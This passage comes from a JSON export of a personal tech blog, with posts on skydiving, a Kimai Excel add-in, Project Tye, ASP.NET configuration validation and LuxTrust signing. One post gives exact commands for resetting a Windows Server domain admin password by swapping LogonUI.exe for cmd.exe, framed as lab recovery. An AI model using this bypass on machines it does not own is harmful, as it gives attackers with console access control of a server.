data-postid=\\"13873193\\" data-share-method=\\"host\\" data-width=\\"100%\\" data-aspect-ratio=\\"1.7808219178082192\\"><a href=\\"https://tenor.com/view/monkey-magic-flying-wow-gif-13873193\\">Monkey Magic Flying GIF</a> from <a href=\\"https://tenor.com/search/monkeymagic-gifs\\">Monkeymagic GIFs</a></div><script type=\\"text/javascript\\" async src=\\"https://tenor.com/embed.js\\"><\/script>  ## The group\\nI was surprised when I noticed that an RTL camera crew had turned up for my skydive. Unfortunately, despite the fact that there only being 2 of us in the group at that point, the camera was for the other person, who, based on the car outside was there for \\"de Journal\\".  ## The Briefing\\nAfter being greeted by our instructor, Lane, we were shown a short video explaining the basics of the skydive, the \\"simple instructions\\" were:  * relax, Lane will help guide you into the correct position.\\n* 2 straight fingers means straighten your legs\\n* bent fingers means bend your legs\\n* finger pointing up means look upwards  That\'s it! Simple, right?  ## The Reality\\nI was assured I was good for a first timer, after 3 flights of 1 minute 20 seconds each I was able to hover without assistance, spin left and right by moving my hands a little, move forward and back by straightening and bending my legs and control myself up and down to some extent by pushing my hips through or straightening my body.  In truth that also included belly flopping into the floor and crashing into the window and crumpling a little which caused me to drop quickly and get caught by Lane before I hit the floor again, not to mention the far from elegant wrestling to get me to the door at the end of my first go.  Somehow when you are in free fall those simple instructions I mentioned earlier become much more difficult, my eyes saw 2 straight fingers, but it took an age to convince my legs to move.  ## The Grand Finale\\nThe HighFly, this was truly a heart in mouth stomach turning experience which I can\'t wait to do again.\\n\\n<video src=\\"/img/videos/Luxfly51MarkburtonTopHighFly.m4v\\" width=\\"75%\\" controls>\\n  <p>If you are reading this, it is because your browser does not support the HTML5 video element</p>\\n</video>\\n\\nhttps://www.tvlux.be/video/info/arlon-le-luxfly-skydive-a-ouvert-ses-portes_34978.html"},{"id":"/2021/05/29/KimaiDotNet-based-Office-Addins","metadata":{"permalink":"/docs/blog/2021/05/29/KimaiDotNet-based-Office-Addins","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-05-29-KimaiDotNet-based-Office-Addins.md","source":"@site/blog/2021-05-29-KimaiDotNet-based-Office-Addins.md","title":"KimaiDotNet based Office Add-ins","description":"Bringing Kimai into the tools you spend your time in","date":"2021-05-29T00:00:00.000Z","tags":[{"inline":false,"label":"VSTO","permalink":"/docs/blog/tags/vsto","description":"Visual Studio Tools for Office"},{"inline":false,"label":"Kimai","permalink":"/docs/blog/tags/kimai","description":"Time tracking application"}],"readingTime":1.17,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"KimaiDotNet based Office Add-ins","authors":["mark-burton"],"tags":["VSTO","Kimai"],"description":"Bringing Kimai into the tools you spend your time in","date":"2021-05-29"},"unlisted":false,"prevItem":{"title":"My First Skydive @ LuxFly","permalink":"/docs/blog/2021/06/11/my-first-skydive"},"nextItem":{"title":"Adding Chaos and Resiliency to asp.net Service with Polly and Simmy","permalink":"/docs/blog/2021/04/03/adding-chaos-and-resiliency-to-aspnet-services"}},"content":"As of v1.0.0.0 released on 09032023 the VSTO is signed with an open source code signing cert from [Certum](https:/shop.certum.euopen-source-code-signing-on-simplysign.html) this should mean the installation is automatically trusted.  If you installed a version before v1.0.0.0 you must uninstall it before installing v1.0.0.0 as the change in signing cert will prevent the upgrade working.  ~~Until I get a real certificate you will need to install [this self-signed certificate](..assetsKimaiExcelmburton_cert.cer) as a `trusted root certification authority` to be able to install the add-in.~~  [Download Excel Add-in](..assetsKimaiExcelMarkZither.KimaiDotNet.ExcelAddin.vsto)  ## Create an API password in Kimai\\n:::warning\\nWARNING!!! If you try and login with your normal password it will fail! \\n:::\\n![Create an API Password in Kimai](/img/kimai_set_api_password.png)  ## Set the API credentials in the Excel Add-in\\n![Set the API credentials in the Excel Add-in](/img/set_the_api_credentials_in_the_excel_addin.png)  ## Save the API credentials to activate the sync\\n![Set the API credentials in the Excel Add-in](/img/kimai_first_sync.png)  ## Usage of the Add-in\\nFor now the Add-in only supports reading existing timesheets and adding new ones, and editing of timesheets will need to be done in Kimai.  ## Questions and suggestions\\nThe GitHub repo can be found at the\\n[KimaiDotNet on GitHub](https:/github.comMarkZitherKimaiDotNet).  ### Milestones\\nFollow the [Milestones](https:/github.comMarkZitherKimaiDotNetmilestones).  ### Issues\\nCreate any bugs or suggestions on [GitHub Issues](https:/github.comMarkZitherKimaiDotNetissues).  ### Discussions\\nStart a discussion on the [GitHub Discussions](https:/github.comMarkZitherKimaiDotNetdiscussions)."},{"id":"/2021/04/03/adding-chaos-and-resiliency-to-aspnet-services","metadata":{"permalink":"/docs/blog/2021/04/03/adding-chaos-and-resiliency-to-aspnet-services","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-04-03-adding-chaos-and-resiliency-to-aspnet-services.md","source":"@site/blog/2021-04-03-adding-chaos-and-resiliency-to-aspnet-services.md","title":"Adding Chaos and Resiliency to asp.net Service with Polly and Simmy","description":"With many connected services there will be exceptions, the should be known, tested and handled in a resilient way","date":"2021-04-03T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET","permalink":"/docs/blog/tags/aspnet","description":"Microsoft ASP.NET framework"},{"inline":false,"label":"Polly","permalink":"/docs/blog/tags/polly","description":".NET resilience and transient-fault-handling library"},{"inline":false,"label":"Simmy","permalink":"/docs/blog/tags/simmy","description":"Chaos engineering library for .NET"},{"inline":false,"label":"Chaos","permalink":"/docs/blog/tags/chaos","description":"Chaos engineering"}],"readingTime":0.03,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Adding Chaos and Resiliency to asp.net Service with Polly and Simmy","authors":["mark-burton"],"tags":["asp.net","Polly","Simmy","Chaos"],"description":"With many connected services there will be exceptions, the should be known, tested and handled in a resilient way","date":"2021-04-03"},"unlisted":false,"prevItem":{"title":"KimaiDotNet based Office Add-ins","permalink":"/docs/blog/2021/05/29/KimaiDotNet-based-Office-Addins"},"nextItem":{"title":"Reset Forgotten Domain Admin Password","permalink":"/docs/blog/2021/02/28/reset-forgotten-domain-admin-password"}},"content":"https:/github.comvany0114chaos-injection-using-simmyblob596206c475b2bd0d5af4e9d065897f4554852cb6srcInfrastructureDuber.Infrastructure.ChaosExtensionsSimmyExtensions.cs"},{"id":"/2021/02/28/reset-forgotten-domain-admin-password","metadata":{"permalink":"/docs/blog/2021/02/28/reset-forgotten-domain-admin-password","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-02-28-reset-forgotten-domain-admin-password.md","source":"@site/blog/2021-02-28-reset-forgotten-domain-admin-password.md","title":"Reset Forgotten Domain Admin Password","description":"Having failed to press save in my password manager I soon found out I didn\'t know my only domain admin password","date":"2021-02-28T00:00:00.000Z","tags":[{"inline":false,"label":"Active Directory","permalink":"/docs/blog/tags/active-directory","description":"Microsoft Active Directory"},{"inline":false,"label":"Windows Server 2019","permalink":"/docs/blog/tags/windows-server-2019","description":"Microsoft Windows Server 2019"}],"readingTime":2.52,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Reset Forgotten Domain Admin Password","authors":["mark-burton"],"tags":["Active Directory","Windows Server 2019"],"description":"Having failed to press save in my password manager I soon found out I didn\'t know my only domain admin password","date":"2021-02-28"},"unlisted":false,"prevItem":{"title":"Adding Chaos and Resiliency to asp.net Service with Polly and Simmy","permalink":"/docs/blog/2021/04/03/adding-chaos-and-resiliency-to-aspnet-services"},"nextItem":{"title":"First Look at Project Tye","permalink":"/docs/blog/2021/02/07/first-look-at-project-tye"}},"content":"Following a series of errors I found myself in a very similar situation to that described by [Rob Beekmans](https:/robbeekmans.neteucreset-your-domain-admin-password), just without the excuse of a bout of flu. But it was just a lab environment so  The basic mistakes I made were:  * Only having a single domain admin in the domain.\\n* Setting up a DSRM password but not testing it\\n* Creating a single snapshot of the VM over 2 years ago\\n* Allowing Windows update to reboot the machine with the new password unsaved in the vault.\\n* Using Hyper-V with an external Virtual Switch, but that is a that is for a different post\\n* Using a keyboards with different layouts to type passwords  So there was no reason to find myself in this position really, but having ended up there and having found [Robs post](https:/robbeekmans.neteucreset-your-domain-admin-password) it looked like the solution was still quite easy, however I am running Windows Server 2019 Core, so there is not GUI and therefore no UTILMAN.exe.  ## The Recovery\\nBoot using the installation media, choose `Repair your computer`, `Troubleshoot` and `Command Prompt`.  You will now be in the command prompt at `X:\\\\Sources`.  To find your Windows install change directory `cd /d c:\\\\Windows\\\\System32`  Where Rob suggests to overwrite UTILMAN.exe with cmd.exe that is not possible in Windows Server Core, instead we can replace `LogonUI.exe`  ```\\ncopy LogonUI.exe LogonUI.exe.BAK\\ncopy CMD.EXE LogonUI.exe\\n```\\nAnswer yes when asked if you want to overwrite LogonUI.exe and then reboot normally.  ```\\nshutdown /r /t 1\\n```  When it reboots you will be taken straight to `cmd.exe`, you can now set the Administrator password with the command  ```\\nnet user Administrator \\"new password\\"\\n```  Boot again using the installation media to change the file names back  ```\\ncopy LogonUI.exe.BAK LogonUI.exe\\ndel LogonUI.exe.BAK\\n```  Reboot a final time and login with your new Administrator password  ## Other options\\nVarious blogs suggest it is possible to get to safe mode using F8 or Ctrl+Shift+Alt+F8 from a cold boot.\\nhttps:/www.surfacetablethelp.com201801how-to-use-f8-key-to-boot-hyper-v-vm-into-safe-mode-on-windows-10.html  I was not able to make that work reliably, in fact it worked once and caused much frustration trying to make it happen again.  I found 2 more reliable ways to get to the safe boot menu:\\nboot from the installation media to access to troubleshoot menu and boot to a command prompt.  At the command prompt type the following command to enable to boot menu.  ```\\nbcdedit /set displaybootmenu yes\\n```  The next command sets the timeout after which the boot will continue to the OS, 5 second should be plenty to press F8 without adding excessive time to the boot.  ```\\nbcdedit /set timeout 5\\n```  It is then possible to login with the  Test it, shut it down, cold boot it, test it again\\nhttps:/docs.microsoft.comen-ustroubleshootwindows-serveridentityreset-directory-services-restore-mode-admin-pwd  https:/docs.microsoft.comen-ustroubleshootazurevirtual-machinescannot-connect-rdp-azure-vm#:~:text=The%20remote%20computer%20that%20you,the%20System%20Properties%20dialog%20box."},{"id":"/2021/02/07/first-look-at-project-tye","metadata":{"permalink":"/docs/blog/2021/02/07/first-look-at-project-tye","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2021-02-07-first-look-at-project-tye.md","source":"@site/blog/2021-02-07-first-look-at-project-tye.md","title":"First Look at Project Tye","description":"C:\\\\WINDOWS\\\\system32>choco install kubernetes-cli","date":"2021-02-07T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Project Tye","permalink":"/docs/blog/tags/project-tye","description":"Microsoft Project Tye"}],"readingTime":2.98,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"First Look at Project Tye","authors":["mark-burton"],"tags":["ASP.NET Core","Project Tye"],"date":"2021-02-07"},"unlisted":false,"prevItem":{"title":"Reset Forgotten Domain Admin Password","permalink":"/docs/blog/2021/02/28/reset-forgotten-domain-admin-password"},"nextItem":{"title":"Validation asp.net Configuration at Startup","permalink":"/docs/blog/2020/11/08/validating-asp.net-application-configuration-at-startup"}},"content":"```\\nPS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> tye deploy --interactive\\nLoading Application Details...\\nVerifying kubectl installation...\\nDrats! \'deploy\' failed:  Cannot apply manifests because kubectl is not installed.\\n```  ```\\nC:\\\\WINDOWS\\\\system32>choco install kubernetes-cli\\nChocolatey v0.10.15\\nInstalling the following packages:\\nkubernetes-cli\\nBy installing you accept licenses for the packages.\\nProgress: Downloading kubernetes-cli 1.20.2... 100%  kubernetes-cli v1.20.2 [Approved]\\nkubernetes-cli package files install completed. Performing other installation steps.\\nThe package kubernetes-cli wants to run \'chocolateyInstall.ps1\'.\\nNote: If you don\'t run this script, the installation will fail.\\nNote: To confirm automatically next time, use \'-y\' or consider:\\nchoco feature enable -n allowGlobalConfirmation\\nDo you want to run the script?([Y]es[A]ll - yes to all[N]o[P]rint): y  Extracting 64-bit C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools\\\\kubernetes-client-windows-amd64.tar.gz to C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools...\\nC:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools\\nExtracting 64-bit C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools\\\\kubernetes-client-windows-amd64.tar to C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools...\\nC:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools  ShimGen has successfully created a shim for kubectl.exe  The install of kubernetes-cli was successful.  Software installed to \'C:\\\\ProgramData\\\\chocolatey\\\\lib\\\\kubernetes-cli\\\\tools\'  Chocolatey installed 11 packages.  See the log for details (C:\\\\ProgramData\\\\chocolatey\\\\logs\\\\chocolatey.log).  C:\\\\WINDOWS\\\\system32>cd C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog  C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog>tye deploy --interactive\\nLoading Application Details...\\nVerifying kubectl installation...\\nDrats! \'deploy\' failed:  Cannot apply manifests because kubectl is not installed.  C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog>kubectl version --client\\nClient Version: version.Info\\\\\\\\{Major:\\"1\\", Minor:\\"20\\", GitVersion:\\"v1.20.2\\", GitCommit:\\"faecb196815e248d3ecfb03c680a4507229c2a56\\", GitTreeState:\\"clean\\", BuildDate:\\"2021-01-13T13:28:09Z\\", GoVersion:\\"go1.15.5\\", Compiler:\\"gc\\", Platform:\\"windowsamd64\\"\\\\}  C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog>cd %USERPROFILE%  C:\\\\Users\\\\mburton>mkdir .kube  C:\\\\Users\\\\mburton>cd .kube  C:\\\\Users\\\\mburton\\\\.kube>New-Item config -type file\\n\'New-Item\' is not recognized as an internal or external command,\\noperable program or batch file.  C:\\\\Users\\\\mburton\\\\.kube>pwsh  PowerShell 7.0.3  Copyright (c) Microsoft Corporation. All rights reserved.  https:/aka.mspowershell  Type \'help\' to get help.  A new PowerShell stable release is available: v7.1.0  Upgrade now, or check out the release page at:  https:/aka.msPowerShell-Release?tag=v7.1.0  PS C:\\\\Users\\\\mburton\\\\.kube> New-Item config -type file  Directory: C:\\\\Users\\\\mburton\\\\.kube  Mode  LastWriteTime  Length Name\\n----  -------------  ------ ----\\n-a---  07022021  00:36  0 config  PS C:\\\\Users\\\\mburton\\\\.kube> cd C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog\\\\\\nPS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> tye deploy --interactive\\nLoading Application Details...\\nVerifying kubectl installation...\\nDrats! \'deploy\' failed:  Cannot apply manifests because kubectl is not installed.\\nPS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> Install-Script -Name \'install-kubectl\' -Scope CurrentUser -Force\\nPS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> install-kubectl.ps1 c:\\\\kubectl\\n==>Getting download link from  https:/kubernetes.iodocstaskstoolsinstall-kubectl/\\n==>analyzing Downloadlink\\n==>starting Download from https:/dl.k8s.ioreleasev1.20.0binwindowsamd64kubectl.exe using Bitstransfer\\n==>starting \'c:\\\\kubectl\\\\kubectl.exe version\'\\nClient Version: version.Info\\\\\\\\{Major:\\"1\\", Minor:\\"20\\", GitVersion:\\"v1.20.0\\", GitCommit:\\"af46c47ce925f4c4ad5cc8d1fca46c7b77d13b38\\", GitTreeState:\\"clean\\", BuildDate:\\"2020-12-08T17:59:43Z\\", GoVersion:\\"go1.15.5\\", Compiler:\\"gc\\", Platform:\\"windowsamd64\\"\\\\}\\nUnable to connect to the server: dial tcp [::1]:8080: connectex: No connection could be made because the target machine actively refused it.  You can now start kubectl from c:\\\\kubectl\\\\kubectl.exe\\ncopy your remote kubernetes cluster information to C:\\\\Users\\\\mburton\\\\.kubeconfig  PS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> tye deploy --interactive\\nLoading Application Details...\\nVerifying kubectl installation...\\nDrats! \'deploy\' failed:  Cannot apply manifests because kubectl is not installed.\\nPS C:\\\\Source\\\\GitRepos\\\\SwaggerAndHealthCheckBlog> kubectl\\nkubectl controls the Kubernetes cluster manager.  Find more information at: https:/kubernetes.iodocsreferencekubectloverview/\\n```  Tye picked random ports while the project app config already specified ports.\\nhttps:/github.comdotnettyeissues178"},{"id":"/2020/11/08/validating-asp.net-application-configuration-at-startup","metadata":{"permalink":"/docs/blog/2020/11/08/validating-asp.net-application-configuration-at-startup","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-11-08-validating-asp.net-application-configuration-at-startup.md","source":"@site/blog/2020-11-08-validating-asp.net-application-configuration-at-startup.md","title":"Validation asp.net Configuration at Startup","description":"Using the Options pattern in ASP.NET Core] allows you to benefit from [Options validation], but this only fires the first time the configuration is accessed.  The Options Pattern is build on top of Configure and OptionsBuilder.Bind(IConfiguration config) will actually call Configure(IConfiguration config) directly, so they are also equivalent. Both methods do the same job but AddOptions came later and allows more customizations.  It would be much better to prevent a service starting if there are configuration values missing or with invalid values. Such functionality is not provided by the framework as of .net5.0, the GitHub issue [Options Validation","date":"2020-11-08T00:00:00.000Z","tags":[{"inline":false,"label":"ASP.NET Core","permalink":"/docs/blog/tags/aspnet-core","description":"Microsoft ASP.NET Core framework"},{"inline":false,"label":"Configuration Options Pattern","permalink":"/docs/blog/tags/configuration-options-pattern","description":"ASP.NET Core configuration patterns"}],"readingTime":0.91,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Validation asp.net Configuration at Startup","authors":["mark-burton"],"tags":["ASP.NET Core","Configuration Options Pattern"],"date":"2020-11-08"},"unlisted":false,"prevItem":{"title":"First Look at Project Tye","permalink":"/docs/blog/2021/02/07/first-look-at-project-tye"},"nextItem":{"title":"Signing Documents With a LuxTrust Signing Stick","permalink":"/docs/blog/2020/10/04/Signing-Documents-With-LuxTrust-Signing-Stick"}},"content":"Using the [Options pattern in ASP.NET Core] allows you to benefit from [Options validation], but this only fires the first time the configuration is accessed.  The `Options Pattern` is build on top of `Configure` and OptionsBuilder.Bind(IConfiguration config) will actually call Configure(IConfiguration config) directly, so they are also equivalent. Both methods do the same job but AddOptions came later and allows more customizations.  It would be much better to prevent a service starting if there are configuration values missing or with invalid values. Such functionality is not provided by the framework as of .net5.0, the GitHub issue [Options Validation: support eager validation] remains open.  The following method of `Options Validation` is taken from [Baget] with small modifications to allow sharing the implementation with multiple services.  You can get the full working demo from [my GitHub repo](https:/github.comMarkZitherSwaggerAndHealthCheckBlog).  [Options pattern in ASP.NET Core]:\\nhttps:/docs.microsoft.comen-usaspnetcorefundamentalsconfigurationoptions?view=aspnetcore-3.1#options-validation\\n[Options validation]: https:/docs.microsoft.comen-usaspnetcorefundamentalsconfigurationoptions?view=aspnetcore-3.1#options-validation\\n[Options Validation: support eager validation]: https:/github.comdotnetruntimeissues36391\\n[Baget]: https:/github.comloic-sharmaBaGet\\n[ConfigureOptions doesn\'t register validations as expected]: https:/github.comdotnetruntimeissues38491"},{"id":"/2020/10/04/Signing-Documents-With-LuxTrust-Signing-Stick","metadata":{"permalink":"/docs/blog/2020/10/04/Signing-Documents-With-LuxTrust-Signing-Stick","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-10-04-Signing-Documents-With-LuxTrust-Signing-Stick.md","source":"@site/blog/2020-10-04-Signing-Documents-With-LuxTrust-Signing-Stick.md","title":"Signing Documents With a LuxTrust Signing Stick","description":"It is not as easy as it should be to sign documents with a LuxTrust Signing Stick, after much trial and error this is what worked for me.","date":"2020-10-04T00:00:00.000Z","tags":[{"inline":false,"label":"LuxTrust Signing Stick","permalink":"/docs/blog/tags/luxtrust-signing-stick","description":"Digital signature device"},{"inline":false,"label":"Gemalto","permalink":"/docs/blog/tags/gemalto","description":"Digital security company"},{"inline":false,"label":"eIDAS","permalink":"/docs/blog/tags/eidas","description":"Electronic identification and trust services"},{"inline":false,"label":"Electronic Signature","permalink":"/docs/blog/tags/electronic-signature","description":"Digital signature technologies"},{"inline":false,"label":"PAdES","permalink":"/docs/blog/tags/pades","description":"PDF Advanced Electronic Signatures"},{"inline":false,"label":"CAdES","permalink":"/docs/blog/tags/cades","description":"CMS Advanced Electronic Signatures"},{"inline":false,"label":"XAdES","permalink":"/docs/blog/tags/xades","description":"XML Advanced Electronic Signatures"}],"readingTime":2.05,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Signing Documents With a LuxTrust Signing Stick","authors":["mark-burton"],"tags":["LuxTrust Signing Stick","Gemalto","eIDAS","Electronic Signature","PAdES","CAdES","XAdES"],"description":"It is not as easy as it should be to sign documents with a LuxTrust Signing Stick, after much trial and error this is what worked for me.","date":"2020-10-04"},"unlisted":false,"prevItem":{"title":"Validation asp.net Configuration at Startup","permalink":"/docs/blog/2020/11/08/validating-asp.net-application-configuration-at-startup"},"nextItem":{"title":"Blue Angels at RAF Hucknall Airshow","permalink":"/docs/blog/2020/09/23/Blue-Angels-at-RAF-Hucknall-Airshow"}},"content":"## Installation\\nInstallation is easy enough, download the correct installer from the [LuxTrust Middleware Download] page and install.  You will see the LuxTrust Middleware running in your system tray.\\n![System Tray After LuxTrust Middleware Install](/img/LuxTrust_Middleware_Post_Install.png) You will notice 2 icons have been added to the systray. The LuxTrust Middleware has the distinctive logo ![LuxTrust Middleware System Tray Icon](/img/LuxTrust_Systray_Icon.png) there are not many options when you click on the Middleware icon, configure allows you to change the log level and `About` has a `Support` tab which provides easy access to the log file (can be found at `%UserProfile%\\\\.luxtrust\\\\logs`), which does become useful quite soon.  But what is this ![LuxTrust Middleware System Tray Icon](/img/Gemalto_Systray_Icon.png) second icon?  Right click on the icon and choose `about`, you are greeted with this `Gemalto Classic Client` about box.\\n![Gemalto Classic Client About Box](/img/Gemalto_About.png) But who are Gemalto and why is their toolbox installed on my system?\\nIt is not mentioned anywhere in the [LuxTrust Middleware Installation Guide] (warning links to a pdf), but if you had been watching the installer closely you will see it installed `Classic Client Toolbox`,  ## Activation  ## Signing PDF  ## Signing XML\\nFinding the right software to sign an XML file is not easy, the following is a list of software I tried with mixed results;  * [Szafir] - Doesn\'t seem to recognise the LuxTrust Signing Stick or certificates. Does have a very nice validator.\\n* [XML Signer] - Doesn\'t support [XAdES] only [XMLDSig]. Hangs if you have not logged in to the Gemalto Classic Client Toolbox to unlock the private keys.\\n* [XML validator Buddy] - Doesn\'t support [XAdES] only [XMLDSig]\\n* [DSS Demonstration WebApp Sign a Document] - Requires [NexU]\\n\\n[LuxTrust Middleware Download]: https://www.luxtrust.lu/simple189\\n[LuxTrust Middleware Installation Guide]: https://www.luxtrust.lu/upload/data/guides/UG-0247-P-E-Install%20LuxTrust%20Middleware%20Windows_0.3.pdf\\n[LuxTrust Pin Management Guide]: https://www.luxtrust.lu/downloads/guides/UG-0234-P-E-Gestion%20Pin%20Windows.pdf\\n[Guichet.lu Technical Help]: https://guichet.public.lu/en/support/aide/aides-techniques.html\\n[LuxTrust Javaless]: https://www.luxtrust.com/the-new-luxtrust-middleware-100-javaless/\\n[Szafir]: https://www.elektronicznypodpis.pl/en/offer/software-for-the-e-signature/\\n[XML Signer]: https:/www.signfiles.comxml-signer/\\n[XML validator Buddy]: https:/www.xml-buddy.comValidatorBuddy.htm\\n[DSS Demonstration WebApp Sign a Document]: https:/ec.europa.eucefdigitalDSSwebapp-demosign-a-document\\n[XAdES]: https:/en.wikipedia.orgwikiXAdES\\n[XMLDSig]: https:/en.wikipedia.orgwikiXML_Signature\\n[NexU]: https:/nowina.lusolutionsjava-less-browser-signing-nexu/\\n[Nexu Open Source on GitHub]: https:/github.comnowina-solutionsnexu\\n[Counter sign a signature with Nowina]: https:/dss.nowina.lucounter-sign\\n[XML signing in Java]: https:/ec.europa.eucefdigitalDSSwebapp-demodocdss-documentation.html#xmlSecurities"},{"id":"/2020/09/23/Blue-Angels-at-RAF-Hucknall-Airshow","metadata":{"permalink":"/docs/blog/2020/09/23/Blue-Angels-at-RAF-Hucknall-Airshow","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-23-Blue-Angels-at-RAF-Hucknall-Airshow.md","source":"@site/blog/2020-09-23-Blue-Angels-at-RAF-Hucknall-Airshow.md","title":"Blue Angels at RAF Hucknall Airshow","description":"In 1973 the U.S. Navy Blue Angels aerobatic team, you won\'t believe what happened next!","date":"2020-09-23T00:00:00.000Z","tags":[{"inline":false,"label":"Blue Angels","permalink":"/docs/blog/tags/blue-angels","description":"US Navy flight demonstration squadron"},{"inline":false,"label":"Red Arrows","permalink":"/docs/blog/tags/red-arrows","description":"RAF aerobatic team"},{"inline":false,"label":"RAF Hucknall","permalink":"/docs/blog/tags/raf-hucknall","description":"Royal Air Force base"}],"readingTime":0.15,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Blue Angels at RAF Hucknall Airshow","authors":["mark-burton"],"tags":["Blue Angles","Red Arrows","RAF Hucknall"],"description":"In 1973 the U.S. Navy Blue Angels aerobatic team, you won\'t believe what happened next!","date":"2020-09-23"},"unlisted":false,"prevItem":{"title":"Signing Documents With a LuxTrust Signing Stick","permalink":"/docs/blog/2020/10/04/Signing-Documents-With-LuxTrust-Signing-Stick"},"nextItem":{"title":"Migrating my blog from Wyam to Statiq","permalink":"/docs/blog/2020/09/21/migrating-my_blog-from-wyam-to-statiq"}},"content":"## References\\nhttps:/forums.airshows.co.ukviewtopic.php?t=65529\\nhttps:/www.britmodeller.comforumsindex.php?topic41001-hucknall-airday-2009/\\nhttps:/nottstalgia.comforumstopic8455-hucknall-airfield?page=3\\nhttps:/www.key.aeroforumhistoric-aviation35764-worst-airshow?page=3\\nhttps:/www.fightercontrol.co.ukforumviewtopic.php?t=154903\\nhttp:/huflighttestmuseum.co.ukvisit.html"},{"id":"/2020/09/21/migrating-my_blog-from-wyam-to-statiq","metadata":{"permalink":"/docs/blog/2020/09/21/migrating-my_blog-from-wyam-to-statiq","editUrl":"https://github.com/MarkZither/mywyamblog/tree/main/docs/blog/2020-09-21-migrating-my_blog-from-wyam-to-statiq.md","source":"@site/blog/2020-09-21-migrating-my_blog-from-wyam-to-statiq.md","title":"Migrating my blog from Wyam to Statiq","description":"The CleanBlog theme has been created for Statiq so time to try and migrate.","date":"2020-09-21T00:00:00.000Z","tags":[{"inline":false,"label":"Wyam","permalink":"/docs/blog/tags/wyam","description":"Static site generator"},{"inline":false,"label":"Statiq","permalink":"/docs/blog/tags/statiq","description":"Static site generator"}],"readingTime":2.09,"hasTruncateMarker":false,"authors":[{"name":"Mark Burton","title":"Software Engineer & Technical Writer","url":"https://github.com/MarkZither","imageURL":"https://github.com/MarkZither.png","key":"mark-burton","page":null}],"frontMatter":{"title":"Migrating my blog from Wyam to Statiq","authors":["mark-burton"],"tags":["Wyam","Statiq"],"description":"The CleanBlog theme has been created for Statiq so time to try and migrate.","date":"2020-09-21"},"unlisted":false,"prevItem":{"title":"Blue Angels at RAF Hucknall Airshow","permalink":"/docs/blog/2020/09/23/Blue-Angels-at-RAF-Hucknall-Airshow"},"nextItem":{"title":"Local Hostname Resolution To Port","permalink":"/docs/blog/2020/09/17/local-hostname-resolution-to-port"}},"content":"The initial steps to setup a new blog with Statiq or migrate from Wyam are covered in [porting from Wyam](https:/github.comstatiqdevCleanBlog#porting-from-wyam) document in the CleanBlog repo.  There are additional points raised in the GitHub discussions on the [StatiqDev Discussions repo](https:/github.comstatiqdevDiscussionsdiscussions) most specifically in the [Migration from Wyam](https:/github.comstatiqdevDiscussionsdiscussions15) discussion.  I had customized my blog slightly while using Wyam so there was some additional work to do.  ## Bringing back the triangles\\nSeveral javascript libraries have been removed from the CleanBlog theme, some of which were used to generate dynamic triangles for the header background when an image is not used. I started the discussion [Javascript changes between Wyam and Statiq CleanBlog (or where have my triangles gone? \ud83d\ude0a )](https:/github.comstatiqdevDiscussionsdiscussions17) and reintroduced the necessary libraries to bring back the triangles.  ## Font Awesome Updates\\nThe move from FontAwesome 4 to 5 means that many icons stopped working, this is due to brand icons moving to a new prefix, so I had to change `fa` to `fab` in a number of places, where `fa` still works it appears better to change those to `fas` based on [FontAwesome\'s own upgrading from version 4 guide](https:/fontawesome.comhow-to-useon-the-websetupupgrading-from-version-4)  ## Fix styles on custom navbar entries\\nI added a dropdown to my navbar, which has lost its style after the upgrade, this appears to be a 